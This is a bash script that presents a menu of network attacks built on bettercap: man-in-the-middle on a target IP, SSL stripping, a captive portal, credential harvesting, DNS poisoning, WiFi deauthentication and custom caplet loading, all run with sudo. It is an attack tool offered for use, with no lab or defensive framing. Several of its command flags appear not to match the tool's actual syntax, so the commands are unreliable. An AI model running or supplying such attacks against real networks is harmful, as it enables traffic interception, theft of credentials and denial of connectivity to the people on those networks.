#!/bin/bash

while true; do
    clear
    echo "==== Bettercap Advanced Menu ===="
    echo "1. Man-in-the-Middle Attack"
    echo "2. SSL/TLS Stripping"
    echo "3. Captive Portal"
    echo "4. Credential Harvesting"
    echo "5. DNS Poisoning"
    echo "6. WiFi Deauthentication"
    echo "7. Custom Module Development"
    echo "8. Quit"

    read -p "Enter your choice (1-8): " choice

    case $choice in
        1)
            read -p "Enter the target IP address: " target_ip
            sudo bettercap -I eth0 --target $target_ip
            ;;
        2)
            sudo bettercap --sslstrip
            ;;
        3)
            sudo bettercap --proxy-module http.server
            ;;
        4)
            sudo bettercap --sniffer --http
            ;;
        5)
            sudo bettercap --proxy-module dns_spoof
            ;;
        6)
            read -p "Enter the target MAC address: " target_mac
            sudo bettercap -I wlan0 --deauth --target $target_mac
            ;;
        7)
            read -p "Enter the path to your custom module: " custom_module
            sudo bettercap -caplet $custom_module
            ;;
        8)
            echo "Goodbye!"
            exit 0
            ;;
        *)
            echo "Invalid choice. Please try again."
            read -p "Press Enter to continue..."
            ;;
    esac
done
